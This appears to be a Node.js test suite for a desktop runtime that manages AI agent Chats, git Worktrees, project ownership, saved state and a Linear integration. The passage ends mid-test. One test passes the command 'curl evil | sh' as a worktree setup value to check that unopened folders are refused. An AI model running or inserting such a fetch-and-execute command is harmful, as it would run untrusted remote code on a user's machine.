const assert = require("node:assert/strict");
const { readProjectState: readSavedState } = require("./project-store.cjs");
const test = require("node:test");
const fs = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const { execFileSync } = require("node:child_process");
const { createRuntime } = require("./runtime.cjs");

async function fixture(t) {
  const dir = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "milagre-core-")));
  const runtimes = [];
  t.after(async () => {
    try {
      for (const runtime of runtimes) await runtime.close();
    } finally {
      await fs.rm(dir, { recursive: true, force: true });
    }
  });
  const project = path.join(dir, "project");
  await fs.mkdir(project);
  execFileSync("git", ["init", "-b", "main", project], { stdio: "ignore" });
  const dataDir = path.join(dir, "profile");
  const events = [];
  const options = {
    dataDir,
    cwd: project,
    version: "9.8.7",
    environmentReady: Promise.resolve(),
    emit: (channel, payload) => events.push({ channel, payload }),
  };
  const make = (overrides = {}) => {
    const runtime = createRuntime({ ...options, ...overrides });
    runtimes.push(runtime);
    return runtime;
  };
  return { project, dataDir, events, options, make };
}

test("Node runtime preserves stored Chats and provider IDs across a restart", async (t) => {
  const { project, options, events, make } = await fixture(t);
  const first = make();
  const opened = await first.invoke("project:current");
  const session = Object.values(opened.state.sessions)[0];
  assert.ok(session);
  await first.invoke("chat:patch", [project, session.id, { title: "Saved Chat", pinned: true }]);
  const file = path.join(project, ".milagre/coordination.json");
  await first.close();
  const saved = JSON.parse(await fs.readFile(file, "utf8"));
  saved.sessions[session.id].native_session_id = "existing-provider-id";
  saved.sessions[session.id].handoverDraft = "# Existing handover";
  saved.messages = [{ id: saved.next_id++, session_id: session.id, role: "user", body: "Existing transcript", context: null }];
  await fs.writeFile(file, JSON.stringify(saved));
  const second = make();
  const reopened = await second.invoke("project:current");
  assert.equal(reopened.state.sessions[session.id].native_session_id, "existing-provider-id");
  assert.equal(reopened.state.sessions[session.id].title, "Saved Chat");
  assert.equal(reopened.state.sessions[session.id].handoverDraft, "# Existing handover");
  assert.equal(reopened.state.messages[0].body, "Existing transcript");
  assert.ok(events.some(({ channel, payload }) => channel === "project:state" && payload.state.sessions[session.id]?.title === "Saved Chat"));
  assert.deepEqual(await second.invoke("chat:runs"), { runs: {}, seq: 0 });
  assert.equal(await second.invoke("app:version"), "9.8.7");
  assert.ok((await second.invoke("skills:list", [project])).skills.some((skill) => skill.name === "tldr"));
  await assert.rejects(second.invoke("not:a-command"), /Unknown command/);
});

test("the old handover commands are gone", async (t) => {
  const { make } = await fixture(t);
  const runtime = make();
  assert.equal(runtime.methods.includes("chat:handover"), false);
  assert.equal(runtime.methods.includes("chat:handover-draft"), false);
  await assert.rejects(runtime.invoke("chat:handover", [{}]), /Unknown command/);
});

test("exclusive ownership rejects another profile owner and aliases of an open Project", async (t) => {
  const { project, dataDir, options, make } = await fixture(t);
  const first = make();
  assert.throws(() => make(), /already owned/);
  await first.openProject(project);
  const alias = path.join(path.dirname(project), "alias");
  await fs.symlink(project, alias);
  const other = make({ dataDir: dataDir + "-other" });
  await assert.rejects(other.openProject(alias), /already owned/);
  await first.close();
  await assert.rejects(first.invoke("project:current"), /closing/);
  await assert.rejects(first.openProject(project), /closing/);
  assert.equal((await other.openProject(alias)).path, project);
});

test("close waits for a command already changing saved settings before releasing ownership", async (t) => {
  const { project, options, make } = await fixture(t);
  const runtime = make();
  await runtime.invoke("project:current");
  const { promise: writing, resolve: started } = Promise.withResolvers();
  const { promise: proceed, resolve: release } = Promise.withResolvers();
  const original = fs.writeFile;
  t.mock.method(fs, "writeFile", async (...args) => {
    if (String(args[0]).includes("project-settings")) {
      started();
      await proceed;
    }
    return original(...args);
  });
  const save = runtime.invoke("worktree-setup:save", [project, "npm ci"]);
  await writing;
  let closed = false;
  const closing = runtime.close().then(() => {
    closed = true;
  });
  await new Promise((resolve) => setImmediate(resolve));
  const completedEarly = closed;
  release();
  await Promise.all([save, closing]);
  assert.equal(completedEarly, false, "close must retain ownership until the write completes");
  const next = make();
  assert.equal((await next.invoke("worktree-setup:read", [project])).setupCommand, "npm ci");
});

test("a damaged existing transcript fails closed instead of being replaced by an empty Project", async (t) => {
  const { project, make } = await fixture(t);
  await fs.mkdir(path.join(project, ".milagre"));
  const file = path.join(project, ".milagre/coordination.json");
  const damaged = '{"messages": ["saved conversation"';
  await fs.writeFile(file, damaged);
  const runtime = make();
  await assert.rejects(runtime.openProject(project), /JSON/);
  assert.equal(await fs.readFile(file, "utf8"), damaged);
});

test("a turn waiting for CLI discovery cannot create an agent after shutdown begins", async (t) => {
  const { project, make } = await fixture(t);
  const started = Promise.withResolvers();
  const discovery = Promise.withResolvers();
  let created = 0;
  const runtime = make({
    titleModels: {},
    agentCli: async () => {
      started.resolve();
      return discovery.promise;
    },
    createSession() {
      created++;
      throw new Error("Should not start while closing");
    },
  });
  const opened = await runtime.openProject(project);
  const session = Object.values(opened.state.sessions)[0];
  await runtime.invoke("chat:send", [
    { projectPath: project, sessionId: session.id, body: "Pending start", provider: "codex", model: "test", permissionMode: "ask" },
  ]);
  await started.promise;
  const closing = runtime.close();
  discovery.resolve({ command: "/fake/codex" });
  await closing;
  assert.equal(created, 0);
  const saved = await readSavedState(project);
  assert.equal(saved.messages[0].body, "Pending start");
  assert.ok(saved.sessions[session.id].resumeTurn);
});

for (const operation of ["create", "remove"]) {
  test(`worktree:${operation} cannot mutate a Project owned by another runtime`, async (t) => {
    const { project, dataDir, make } = await fixture(t);
    execFileSync(
      "git",
      [
        "-C",
        project,
        "-c",
        "user.name=Fixture",
        "-c",
        "user.email=fixture@example.test",
        "-c",
        "commit.gpgsign=false",
        "-c",
        "core.hooksPath=/dev/null",
        "commit",
        "--allow-empty",
        "-m",
        "Initial",
      ],
      { stdio: "ignore" },
    );
    const worktreeRoot = path.join(path.dirname(project), "worktrees");
    const target = path.join(worktreeRoot, "existing");
    await fs.mkdir(worktreeRoot);
    if (operation === "remove") execFileSync("git", ["-C", project, "worktree", "add", "-b", "existing", target, "main"], { stdio: "ignore" });
    const owner = make({ worktreeRoot });
    await owner.openProject(project);
    const other = make({ dataDir: dataDir + "-other", worktreeRoot });
    const listing = () => execFileSync("git", ["-C", project, "worktree", "list", "--porcelain"], { encoding: "utf8" });
    const before = listing();
    if (operation === "create") {
      await assert.rejects(other.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", prompt: "Ownership check" }]), /already owned/);
    } else {
      // A runtime that hasn't opened the Project refuses before it takes ownership of anything.
      await assert.rejects(other.invoke("worktree:remove", [target, { projectPath: project, base: "main" }]), /Open this project in Milagre first/);
    }
    assert.equal(listing(), before, "A rejected command must leave every Worktree in place");
  });
}

test("opening a linked checkout cannot bypass the repository runtime owner", async (t) => {
  const { project, dataDir, make } = await fixture(t);
  execFileSync(
    "git",
    [
      "-C",
      project,
      "-c",
      "user.name=Fixture",
      "-c",
      "user.email=fixture@example.test",
      "-c",
      "commit.gpgsign=false",
      "-c",
      "core.hooksPath=/dev/null",
      "commit",
      "--allow-empty",
      "-m",
      "Initial",
    ],
    { stdio: "ignore" },
  );
  const linked = path.join(path.dirname(project), "linked");
  execFileSync("git", ["-C", project, "worktree", "add", "-b", "linked", linked], { stdio: "ignore" });
  await make().openProject(project);
  const other = make({ dataDir: dataDir + "-other" });
  await assert.rejects(other.openProject(linked), /already owned/);
  await assert.rejects(fs.stat(path.join(linked, ".milagre/coordination.json")), { code: "ENOENT" });
});

test("Chat edits still report a disk failure while streaming writes are deferred", async (t) => {
  const { project, make } = await fixture(t);
  const runtime = make();
  const opened = await runtime.openProject(project);
  const session = Object.values(opened.state.sessions)[0];
  const rename = fs.rename;
  let fail = true;
  t.mock.method(fs, "rename", async (...args) => {
    if (fail && String(args[1]).endsWith("/coordination.json")) throw new Error("disk full");
    return rename(...args);
  });
  for (const [method, args] of [
    ["chat:patch", [project, session.id, { title: "Keep my title" }]],
    ["chat:archive-subagent", [project, session.id, "none", true]],
    ["chat:archive-finished-subagents", [project, session.id]],
  ]) {
    await assert.rejects(runtime.invoke(method, args), /disk full/);
  }
  fail = false;
  await runtime.close();
  assert.equal((await readSavedState(project)).sessions[session.id].title, "Keep my title");
});

test("a failed Worktree discovery preserves existing Chats and disk state", async (t) => {
  const { project, make } = await fixture(t);
  const runtime = make();
  const opened = await runtime.openProject(project);
  const session = Object.values(opened.state.sessions)[0];
  await runtime.invoke("chat:patch", [project, session.id, { title: "Never erase this" }]);
  const file = path.join(project, ".milagre/coordination.json");
  const before = await fs.readFile(file, "utf8");
  await fs.rename(path.join(project, ".git"), path.join(project, ".git-unavailable"));
  try {
    await assert.rejects(runtime.openProject(project));
  } finally {
    await fs.rename(path.join(project, ".git-unavailable"), path.join(project, ".git"));
  }
  assert.equal((await runtime.invoke("project:snapshot", [project])).state.sessions[session.id].title, "Never erase this");
  await runtime.close();
  assert.equal(JSON.parse(await fs.readFile(file, "utf8")).sessions[session.id].title, JSON.parse(before).sessions[session.id].title);
});

test("quit stops agents after a disk failure and can retry before releasing ownership", async (t) => {
  const { project, make } = await fixture(t);
  let closed = 0,
    created = false;
  const runtime = make({
    titleModels: {},
    agentCli: async () => ({ command: "/fake" }),
    createSession(_provider, options) {
      created = true;
      return {
        turnActive: true,
        closed: false,
        startTurn: async () => {
          options.emit({ type: "turn-started", turnId: "t" });
          return { turnId: "t" };
        },
        close: async () => {
          closed++;
          options.emit({ type: "turn-cancelled" });
        },
      };
    },
  });
  const opened = await runtime.openProject(project);
  const session = Object.values(opened.state.sessions)[0];
  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: session.id, body: "Keep me", provider: "codex", model: "test" }]);
  // oxlint-disable-next-line no-unmodified-loop-condition -- createSession assigns created when the runtime starts the turn while the loop waits
  for (let i = 0; i < 100 && !created; i++) await new Promise((resolve) => setTimeout(resolve, 5));
  assert.equal(created, true);
  const rename = fs.rename;
  let fail = true;
  t.mock.method(fs, "rename", async (...args) => {
    if (fail && String(args[1]).endsWith("/coordination.json")) throw new Error("disk full");
    return rename(...args);
  });
  await assert.rejects(runtime.close(), /disk full/);
  assert.ok(closed > 0, "providers must stop even when persistence fails");
  assert.throws(() => make(), /already owned/);
  fail = false;
  await runtime.close();
  const next = make();
  const restored = await next.openProject(project);
  assert.ok(restored.state.messages.some((m) => m.body === "Keep me"));
});

test("agent:interrupt during a preparing handoff cancels it, fails the divider and starts no agent", async (t) => {
  const { project, make } = await fixture(t);
  const blocked = Promise.withResolvers();
  let blockClaude = false;
  const sessions = [];
  const runtime = make({
    titleModels: {},
    agentCli: async (provider) => {
      if (provider === "claude" && blockClaude) {
        blocked.resolve();
        return new Promise(() => {});
      }
      return { command: "/fake" };
    },
    createSession(provider, options) {
      const session = {
        provider,
        turnActive: false,
        closed: false,
        startTurn: async () => {
          options.emit({ type: "turn-started", turnId: "t" });
          if (provider === "claude") {
            options.emit({ type: "session-started", nativeId: "claude-1" });
            options.emit({ type: "text-delta", messageId: "m1", text: "Done." });
            options.emit({ type: "turn-completed" });
          }
          return { turnId: "t" };
        },
        interrupt: async () => {},
        close: async () => {},
      };
      sessions.push(session);
      return session;
    },
  });
  const opened = await runtime.openProject(project);
  const chat = Object.values(opened.state.sessions)[0];
  const chatId = `${project}#${chat.id}`;
  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body: "first", provider: "claude", model: "claude-opus-5-5" }]);
  const stateOf = async () => (await runtime.invoke("project:snapshot", [project])).state;
  for (let i = 0; i < 200 && !(await stateOf()).messages.some((item) => item.outcome === "completed"); i++) await new Promise((r) => setTimeout(r, 10));
  blockClaude = true;
  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body: "switch", provider: "codex", model: "gpt-6" }]);
  await blocked.promise;
  await runtime.invoke("agent:interrupt", [chatId]);
  await new Promise((r) => setTimeout(r, 50));
  const state = await stateOf();
  const dividers = state.messages.filter((item) => item.context?.kind === "handoff");
  assert.deepEqual(
    dividers.map((item) => item.context.status),
    ["failed"],
  );
  assert.equal(state.sessions[chat.id].provider, "claude");
  assert.equal(
    sessions.some((item) => item.provider === "codex"),
    false,
  );
  assert.ok(state.messages.some((item) => item.outcome === "cancelled"));
});

test("linked Worktrees resolve to one registered Project without losing saved Chats", async (t) => {
  const { project, make } = await fixture(t);
  execFileSync("git", ["-C", project, "-c", "user.name=Test", "-c", "user.email=test@example.invalid", "commit", "--allow-empty", "-m", "Initial"], {
    stdio: "ignore",
  });
  const linked = path.join(path.dirname(project), "linked");
  execFileSync("git", ["-C", project, "worktree", "add", "-b", "linked", linked], { stdio: "ignore" });
  const runtime = make();
  const first = await runtime.openProject(project);
  const chat = Object.values(first.state.sessions)[0];
  await runtime.invoke("chat:patch", [project, chat.id, { title: "Keep this Chat" }]);
  const reopened = await runtime.openProject(linked);
  assert.equal(reopened.path, project);
  assert.equal(reopened.state.sessions[chat.id].title, "Keep this Chat");
  const recent = await runtime.invoke("project:recent");
  assert.equal(recent.filter((item) => item.path === project).length, 1);
  assert.ok(!recent.some((item) => item.path === linked));
  const id = path.join(project, ".git");
  await runtime.invoke("project:position", [id, { x: 30, y: 40 }]);
  const registered = (await runtime.invoke("project:registry")).find((item) => item.id === id);
  assert.equal(registered.path, project);
  assert.deepEqual(registered.position, { x: 30, y: 40 });
});

test("canvas Links survive runtime restart and worktree:remove clears their endpoints", async (t) => {
  const { project, make } = await fixture(t);
  const commit = (folder) =>
    execFileSync("git", ["-C", folder, "-c", "user.name=Test", "-c", "user.email=test@example.invalid", "commit", "--allow-empty", "-m", "Initial"], {
      stdio: "ignore",
    });
  commit(project);
  const other = path.join(path.dirname(project), "other");
  await fs.mkdir(other);
  execFileSync("git", ["init", "-b", "main", other], { stdio: "ignore" });
  commit(other);
  const root = path.join(path.dirname(project), "worktrees");
  await fs.mkdir(root);
  const linked = path.join(root, "linked");
  execFileSync("git", ["-C", project, "worktree", "add", "-b", "milagre/linked", linked], { stdio: "ignore" });
  const first = make({ worktreeRoot: root, registryRoots: [] });
  await first.openProject(project);
  await first.openProject(other);
  const before = await first.invoke("canvas:snapshot");
  assert.equal(before.projects.length, 2);
  assert.ok(before.states.find((entry) => entry.path === project).state.worktrees);
  const a = before.projects.find((entry) => entry.path === project).id;
  const b = before.projects.find((entry) => entry.path === other).id;
  await first.invoke("canvas:link-add", [{ project_id: a, worktree_path: linked }, { project_id: b }]);
  assert.equal((await first.invoke("canvas:snapshot")).links.length, 1);
  // A saved edit writes the Project's state to disk.
  const anySession = Object.values(before.states.find((entry) => entry.path === project).state.sessions)[0];
  await first.invoke("chat:patch", [project, anySession.id, { title: "Saved" }]);
  await first.close();
  // Milagre records the base of a worktree it made; this one was added by git, so the test records it.
  const file = path.join(project, ".milagre/coordination.json");
  const saved = JSON.parse(await fs.readFile(file, "utf8"));
  const entry = Object.values(saved.worktrees).find((worktree) => worktree.path === linked);
  entry.base = "main";
  await fs.writeFile(file, JSON.stringify(saved));
  const chat = Object.values(saved.sessions).find((session) => session.worktree_id === entry.id);
  const second = make({ worktreeRoot: root, registryRoots: [] });
  assert.equal((await second.invoke("canvas:snapshot")).links.length, 1);
  const seen = await second.invoke("worktree:status", [linked, "main"]);
  await second.invoke("worktree:remove", [
    linked,
    { projectPath: project, base: "main", seen, force: false, ...(chat ? { chatId: `${project}#${chat.id}` } : {}) },
  ]);
  assert.deepEqual((await second.invoke("canvas:snapshot")).links, []);
});

test("opening a saved Codex Chat starts outcome recovery and shutdown drains its provider read", async (t) => {
  const { project, make } = await fixture(t);
  const first = make();
  const opened = await first.invoke("project:current");
  const session = Object.values(opened.state.sessions)[0];
  await first.invoke("chat:patch", [project, session.id, { title: "Saved recovery Chat" }]);
  await first.close();
  const file = path.join(project, ".milagre/coordination.json");
  const saved = JSON.parse(await fs.readFile(file, "utf8"));
  Object.assign(saved.sessions[session.id], {
    provider: "codex",
    native_session_id: "saved-parent",
    subagents: [{ id: "saved-child", title: "Saved task", status: "unknown", startedAt: 10, updatedAt: 20, transcript: [] }],
  });
  await fs.writeFile(file, JSON.stringify(saved));
  const reading = Promise.withResolvers();
  const discovery = Promise.withResolvers();
  const runtime = make({
    agentCli: async (provider) => {
      assert.equal(provider, "codex");
      reading.resolve();
      return discovery.promise;
    },
  });
  await runtime.invoke("project:current");
  await runtime.invoke("chat:set-open", [`${project}#${session.id}`]);
  await reading.promise;
  let closed = false;
  const closing = runtime.close().then(() => {
    closed = true;
  });
  await new Promise((resolve) => setImmediate(resolve));
  const completedEarly = closed;
  discovery.resolve({ problem: "Provider unavailable in this fixture" });
  await closing;
  assert.equal(completedEarly, false, "shutdown must retain ownership until outcome recovery finishes");
  const next = make();
  const reopened = await next.invoke("project:current");
  assert.equal(reopened.state.sessions[session.id].subagents[0].status, "unknown");
  assert.deepEqual(await next.invoke("chat:runs"), { runs: {}, seq: 0 });
});

test("resuming recent projects reads raw JSON and loads only the projects with a pending turn", async (t) => {
  const { project, make } = await fixture(t);
  const first = make();
  const opened = await first.invoke("project:current");
  const session = Object.values(opened.state.sessions)[0];
  await first.invoke("chat:patch", [project, session.id, { title: "Saved Chat" }]);
  const file = path.join(project, ".milagre/coordination.json");
  const sidecar = `${"a".repeat(64)}.json`;
  await first.close();
  const saved = JSON.parse(await fs.readFile(file, "utf8"));
  saved.sessions[session.id].subagents = [
    {
      id: "child",
      title: "Review",
      status: "completed",
      startedAt: 1,
      updatedAt: 2,
      transcriptFile: sidecar,
      transcript: [{ id: "m", kind: "message", text: "x", compact: true }],
    },
  ];
  await fs.writeFile(file, JSON.stringify(saved));

  const reads = [];
  const readFile = fs.readFile;
  t.mock.method(fs, "readFile", (...args) => {
    reads.push(String(args[0]));
    return readFile(...args);
  });
  const second = make();
  await second.resumeRecentProjects();
  assert.deepEqual(
    reads.filter((name) => name.includes("subagents")),
    [],
    "no transcript sidecar is hydrated",
  );
  // Hydration resolves (and creates) the content folder; the raw read must not.
  await assert.rejects(fs.stat(path.join(project, ".milagre/subagents")), { code: "ENOENT" });
  await assert.rejects(second.invoke("project:snapshot", [project]), /Open the project/);
  await second.close();

  saved.sessions[session.id].resumeTurn = { stoppedAt: 0 };
  await fs.writeFile(file, JSON.stringify(saved));
  const third = make();
  await third.resumeRecentProjects();
  assert.equal((await third.invoke("project:snapshot", [project])).path, project);
});

test("path-taking commands refuse folders that are not open or recent", async (t) => {
  const { project, make } = await fixture(t);
  const runtime = make();
  const stranger = await fs.mkdtemp(path.join(os.tmpdir(), "milagre-stranger-"));
  t.after(() => fs.rm(stranger, { recursive: true, force: true }));
  for (const [method, args] of [
    ["worktree-setup:save", [stranger, "curl evil | sh"]],
    ["files-to-copy:read", [stranger]],
    ["skills:list", [stranger]],
    ["project:branches", [stranger]],
    ["worktree:status", [stranger]],
    ["project:image", [stranger]],
  ]) {
    await assert.rejects(runtime.invoke(method, args), /Open this project/, method);
  }
  await runtime.invoke("project:current");
  assert.equal((await runtime.invoke("worktree-setup:read", [project])).setupCommand, "");
  await runtime.close();
});

test("an open project's worktree folders are read without its whole state", async (t) => {
  const { project, make } = await fixture(t);
  const runtime = make();
  await runtime.openProject(project);
  assert.deepEqual(await runtime.invoke("project:worktree-paths", [project]), [project]);
  await assert.rejects(runtime.invoke("project:worktree-paths", [path.join(project, "elsewhere")]), /Open the project/);
});

test("attachment preview command serves Worktree files and saved external attachments only", async (t) => {
  const { project, make } = await fixture(t);
  const first = make();
  const opened = await first.invoke("project:current");
  const local = path.join(project, "ui.tsx");
  const external = path.join(path.dirname(project), "attached.txt");
  await fs.writeFile(local, "export const ui = true;");
  await fs.writeFile(external, "outside the Worktree");
  assert.equal((await first.invoke("attachment:preview", [local])).text, "export const ui = true;");
  await assert.rejects(first.invoke("attachment:preview", [external]), /attached file|open Worktree/);
  await first.invoke("chat:patch", [project, Number(Object.keys(opened.state.sessions)[0]), { title: "Attachments" }]);
  await first.close();
  const stored = path.join(project, ".milagre/coordination.json");
  // Written back with the messages inline, as an older file has them; the next read takes them from there.
  const state = await readSavedState(project);
  state.messages.push({
    id: state.next_id++,
    session_id: Number(Object.keys(opened.state.sessions)[0]),
    role: "user",
    body: "Read this",
    files: [external],
    context: null,
  });
  await fs.writeFile(stored, JSON.stringify(state));
  const second = make();
  await second.invoke("project:current");
  assert.equal((await second.invoke("attachment:preview", [external])).text, "outside the Worktree");
});

// A clone of a remote that has moved on: the clone's main is one commit behind.
async function trailingClone(project) {
  const root = path.dirname(project);
  const id = ["-c", "user.name=Milagre", "-c", "user.email=milagre@example.com"];
  const remote = path.join(root, "remote");
  const clone = path.join(root, "clone");
  await fs.mkdir(remote);
  const remoteGit = (...args) => execFileSync("git", ["-C", remote, ...id, ...args], { encoding: "utf8" }).trim();
  remoteGit("init", "-q", "-b", "main");
  await fs.writeFile(path.join(remote, "README.md"), "shop\n");
  remoteGit("add", ".");
  remoteGit("commit", "-qm", "init");
  execFileSync("git", ["clone", "--quiet", remote, clone]);
  await fs.writeFile(path.join(remote, "NEWS.md"), "shipped\n");
  remoteGit("add", ".");
  remoteGit("commit", "-qm", "ship");
  const git = (...args) => execFileSync("git", ["-C", clone, ...args], { encoding: "utf8" }).trim();
  return { remote, clone, git, behind: git("rev-parse", "main"), ahead: remoteGit("rev-parse", "main") };
}

test("worktree:create syncs main first only when main sync is on, and survives a failed sync", async (t) => {
  const { project, events, make } = await fixture(t);
  const { remote, clone, git, behind, ahead } = await trailingClone(project);
  const worktreeRoot = path.join(path.dirname(project), "worktrees");
  const runtime = make({ cwd: clone, worktreeRoot });
  await runtime.openProject(clone);
  const create = () => runtime.invoke("worktree:create", [{ projectPath: clone, baseBranch: "main", prompt: "" }]);

  assert.deepEqual(await runtime.invoke("main-sync:read", [clone]), { branch: "main", override: null, defaultValue: false, enabled: false, last: null });
  await create();
  assert.equal(git("rev-parse", "main"), behind, "Off by default: main stays where it was");
  assert.equal(
    events.some(({ channel }) => channel === "main-sync:status"),
    false,
  );

  assert.deepEqual(await runtime.invoke("main-sync:default:save", [true]), { syncMain: true });
  assert.deepEqual(await runtime.invoke("main-sync:default:read"), { syncMain: true });
  await create();
  assert.equal(git("rev-parse", "main"), ahead);
  assert.equal(await fs.readFile(path.join(clone, "NEWS.md"), "utf8"), "shipped\n");
  const status = events.find(({ channel }) => channel === "main-sync:status");
  assert.deepEqual(
    { ...status.payload, last: { ...status.payload.last, at: 0 } },
    {
      projectPath: clone,
      last: { at: 0, outcome: "updated", branch: "main", commit: ahead.slice(0, 7) },
    },
  );
  assert.equal((await runtime.invoke("main-sync:read", [clone])).last.outcome, "updated");

  const off = await runtime.invoke("main-sync:save", [clone, false]);
  assert.equal(off.enabled, false);
  assert.equal(off.override, false);
  await runtime.invoke("main-sync:save", [clone, null]);

  await fs.rm(remote, { recursive: true, force: true });
  const created = await create();
  assert.ok(Number.isInteger(created.worktreeId), "A failed sync never blocks the Worktree");
  const last = (await runtime.invoke("main-sync:read", [clone])).last;
  assert.equal(last.outcome, "failed");
  assert.equal(last.message, "Could not reach origin");
});

test("two worktree:create calls share one sync", async (t) => {
  const { project, events, make } = await fixture(t);
  const { clone } = await trailingClone(project);
  const runtime = make({ cwd: clone, worktreeRoot: path.join(path.dirname(project), "worktrees") });
  await runtime.openProject(clone);
  await runtime.invoke("main-sync:save", [clone, true]);
  const create = () => runtime.invoke("worktree:create", [{ projectPath: clone, baseBranch: "main", prompt: "" }]);
  await Promise.all([create(), create()]);
  assert.equal(events.filter(({ channel }) => channel === "main-sync:status").length, 1);
});

test("main-sync commands refuse a folder Milagre hasn't opened", async (t) => {
  const { make } = await fixture(t);
  const runtime = make();
  await assert.rejects(runtime.invoke("main-sync:read", ["/not/opened"]), /Open this project in Milagre first/);
  await assert.rejects(runtime.invoke("main-sync:save", ["/not/opened", true]), /Open this project in Milagre first/);
});

test("linear commands connect, report and disconnect, and emit the status", async (t) => {
  const { make, events } = await fixture(t);
  const json = (status, body) => ({ ok: true, status, json: async () => body });
  const runtime = make({
    linear: {
      clientId: "cid",
      apiBase: "https://api.test",
      port: 0,
      fetchImpl: async (url) =>
        url.endsWith("/oauth/token")
          ? json(200, { access_token: "a1", refresh_token: "r1", expires_in: 86400 })
          : json(200, { data: { viewer: { name: "Victor", email: "v@x" }, organization: { name: "Acme", urlKey: "acme" } } }),
      openBrowser: (url) => {
        const params = new URL(url).searchParams;
        void fetch(`${params.get("redirect_uri")}?code=abc&state=${params.get("state")}`);
      },
    },
  });
  assert.deepEqual(await runtime.invoke("linear:status"), { connected: false });
  assert.deepEqual(await runtime.invoke("linear:enabled:read"), { enabled: false });
  assert.deepEqual(await runtime.invoke("linear:enabled:save", [true]), { enabled: true });
  const connected = await runtime.invoke("linear:connect");
  assert.equal(connected.connected, true);
  assert.deepEqual(
    events.filter((event) => event.channel === "linear:status-changed").map((event) => event.payload),
    [connected],
  );
  assert.deepEqual(await runtime.invoke("linear:disconnect"), { connected: false });
  assert.deepEqual(events.filter((event) => event.channel === "linear:status-changed").at(-1).payload, { connected: false });
});

test("flush ends a waiting Linear sign-in instead of waiting out its timeout", async (t) => {
  const { make } = await fixture(t);
  const runtime = make({
    linear: {
      clientId: "cid",
      apiBase: "https://api.test",
      port: 0,
      fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({}) }),
      openBrowser: () => {},
    },
  });
  const waiting = runtime.invoke("linear:connect");
  const rejected = assert.rejects(waiting, { code: "cancelled" });
  await new Promise((resolve) => setTimeout(resolve, 50));
  const started = Date.now();
  await runtime.flush();
  assert.ok(Date.now() - started < 5000, "flush returned promptly");
  await rejected;
});

async function connectLinearFixture(dataDir) {
  // A signed-in Mac with the Experimental switch on, without running the OAuth flow.
  await fs.mkdir(path.join(dataDir, "linear"), { recursive: true });
  await fs.writeFile(
    path.join(dataDir, "linear", "token.json"),
    JSON.stringify({
      accessToken: "access",
      refreshToken: "refresh",
      expiresAt: Date.now() + 86_400_000,
      viewer: { name: "Victor", email: "v@example.test" },
      organization: { name: "Acme", urlKey: "acme" },
    }),
  );
  await fs.writeFile(path.join(dataDir, "linear", "settings.json"), JSON.stringify({ enabled: true }));
}

const linearIssueNode = (key, branchName) => ({
  identifier: key,
  title: "Fix the login redirect",
  url: `https://linear.app/acme/issue/${key}`,
  branchName,
  description: null,
  state: { name: "Todo", type: "unstarted", color: "#aaa" },
});

test("worktree:create from a Linear issue names the branch after it, skips the Haiku name and remembers the issue", async (t) => {
  const { project, dataDir, events, make } = await fixture(t);
  execFileSync("git", ["-C", project, "-c", "user.name=Test", "-c", "user.email=test@example.invalid", "commit", "--allow-empty", "-m", "Initial"], {
    stdio: "ignore",
  });
  await connectLinearFixture(dataDir);
  const bodies = [];
  let issue = linearIssueNode("ENG-12", "eng-12-fix-login");
  const json = (body) => ({ ok: true, status: 200, json: async () => body });
  const runtime = make({
    worktreeRoot: path.join(path.dirname(project), "worktrees"),
    linear: {
      clientId: "cid",
      apiBase: "https://api.test",
      port: 0,
      fetchImpl: async (url, init) => {
        const body = JSON.parse(init.body);
        bodies.push(body.query);
        if (body.query.includes("teams(")) return json({ data: { teams: { nodes: [{ key: "ENG" }] } } });
        return json({ data: { i0: issue } });
      },
      openBrowser: () => {},
    },
  });
  await runtime.openProject(project);
  const created = await runtime.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", prompt: "Ignored", issueKey: "ENG-12" }]);
  const worktree = created.project.state.worktrees[created.worktreeId];
  assert.equal(worktree.name, "eng-12-fix-login");
  assert.equal(worktree.linearIssue, "ENG-12");
  assert.match(path.basename(worktree.path), /^eng-12-fix-login-[a-z0-9]{4}$/);
  await new Promise((resolve) => setTimeout(resolve, 50));
  assert.equal(
    events.some(({ channel }) => channel === "worktree:renamed"),
    false,
    "An issue's branch keeps its name: the Haiku rename never runs",
  );

  issue = null;
  const before = execFileSync("git", ["-C", project, "worktree", "list", "--porcelain"], { encoding: "utf8" });
  await assert.rejects(runtime.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", prompt: "", issueKey: "ENG-99" }]), {
    message: "ENG-99 no longer exists in Linear.",
  });
  assert.equal(execFileSync("git", ["-C", project, "worktree", "list", "--porcelain"], { encoding: "utf8" }), before);
});

test("linear:worktree-issues names a worktree's issue and linear:issues reports the switch", async (t) => {
  const { project, dataDir, events, make } = await fixture(t);
  execFileSync("git", ["-C", project, "-c", "user.name=Test", "-c", "user.email=test@example.invalid", "commit", "--allow-empty", "-m", "Initial"], {
    stdio: "ignore",
  });
  const json = (body) => ({ ok: true, status: 200, json: async () => body });
  const runtime = make({
    worktreeRoot: path.join(path.dirname(project), "worktrees"),
    linear: {
      clientId: "cid",
      apiBase: "https://api.test",
      port: 0,
      fetchImpl: async (url, init) => {
        const body = JSON.parse(init.body);
        if (body.query.includes("teams(")) return json({ data: { teams: { nodes: [{ key: "ENG" }] } } });
        if (body.query.includes("assignedIssues")) return json({ data: { viewer: { assignedIssues: { nodes: [linearIssueNode("ENG-3", "eng-3")] } } } });
        return json({ data: { i0: linearIssueNode("ENG-12", "eng-12-fix-login") } });
      },
      openBrowser: () => {},
    },
  });
  await runtime.openProject(project);
  assert.deepEqual(await runtime.invoke("linear:issues", [{}]), { error: "Linear is off in Settings › Experimental.", notConnected: true });
  assert.deepEqual(await runtime.invoke("linear:worktree-issues", [project]), {});
  assert.deepEqual(await runtime.invoke("linear:enabled:save", [true]), { enabled: true });
  assert.deepEqual(events.filter((event) => event.channel === "linear:enabled-changed").at(-1).payload, { enabled: true });
  await connectLinearFixture(dataDir);

  const issues = await runtime.invoke("linear:issues", [{}]);
  assert.deepEqual(
    issues.issues.map((item) => item.key),
    ["ENG-3"],
  );
  const created = await runtime.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", prompt: "Plain" }]);
  const plain = created.project.state.worktrees[created.worktreeId];
  assert.equal(plain.linearIssue, undefined);
